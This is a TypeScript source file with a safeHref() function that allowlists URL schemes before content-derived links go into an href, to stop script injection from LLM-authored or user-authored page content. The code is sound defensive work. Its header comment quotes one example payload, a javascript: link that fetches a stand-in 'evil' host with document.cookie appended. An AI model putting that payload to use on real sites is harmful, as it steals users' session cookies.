// Scheme-allowlisting for URLs that flow into an <a href> / click handler.
//
// Security (code-review B6/B7): Workpage content is authored by LLMs and
// other (potentially untrusted) users. A link like
// [x](javascript:fetch('//evil/'+document.cookie)) rendered as
// <a href="javascript:…"> executes in the app origin on click — Vue
// escapes interpolated *text* but NOT the scheme of a :href binding.
// Every place that binds a content-derived URL to an href must route it
// through safeHref().

// A scheme is `scheme:` per RFC-3986: an ASCII letter followed by
// letters / digits / `+` / `-` / `.`, then a colon.
const SCHEME_RE = /^([a-z][a-z0-9+.-]*):/i;

// Schemes safe to navigate to. `vance:` is the app's canonical in-doc
// URI (resolved by the host). No `data:` (SVG/HTML script), no
// `javascript:` / `vbscript:`.
const ALLOWED_SCHEMES = new Set(['http', 'https', 'mailto', 'tel', 'vance']);

// C0 control chars + DEL. Browsers silently strip tab / newline / CR
// from URLs, so "java<TAB>script:…" would still execute — remove them
// before inspecting the scheme. Built from a string to keep literal
// control characters out of the source.
const CONTROL_CHARS_RE = new RegExp('[\\u0000-\\u001F\\u007F]', 'g');

/**
 * Returns {@code raw} if it is safe to place in an `href`, else `'#'`.
 *
 * Relative URLs, fragments (`#…`), path-absolute (`/…`), query-only
 * (`?…`) and protocol-relative (`//host`) URLs carry no scheme and are
 * returned unchanged (they cannot execute script). Any URL whose scheme
 * is not in the allowlist collapses to `'#'`.
 */
export function safeHref(raw: string | null | undefined): string {
  if (raw == null) return '#';
  const s = raw.replace(CONTROL_CHARS_RE, '').trim();
  if (s === '') return '#';
  const m = SCHEME_RE.exec(s);
  if (!m) return s; // no scheme → relative / fragment / path — safe
  return ALLOWED_SCHEMES.has(m[1].toLowerCase()) ? s : '#';
}
